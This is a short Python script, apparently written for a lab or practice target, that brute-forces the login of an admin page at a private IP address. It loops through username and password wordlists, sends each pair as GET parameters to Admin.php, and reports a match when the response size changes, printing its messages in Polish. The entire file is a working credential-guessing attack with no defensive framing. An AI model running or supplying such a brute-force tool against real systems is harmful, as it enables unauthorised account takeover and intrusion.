import requests

def brute_force():
    with open ("usernames","r") as usernames, open ("passwords","r") as password:
        user = usernames.read().split("\n")
        haslo = password.read().split("\n")
        url = 'http://192.168.1.118/Admin.php?Email='
        for i in user:
            for j in haslo:
                full_path = f"{url}{i}&Password={j}"
                response = requests.get(full_path)
                if response.status_code == 200:
                    response_size = len(response.content)
                    if response_size != 9236:
                        print(f'Jest!! Hasło to: {j}, a username to: {i}' )
                        return

brute_force()
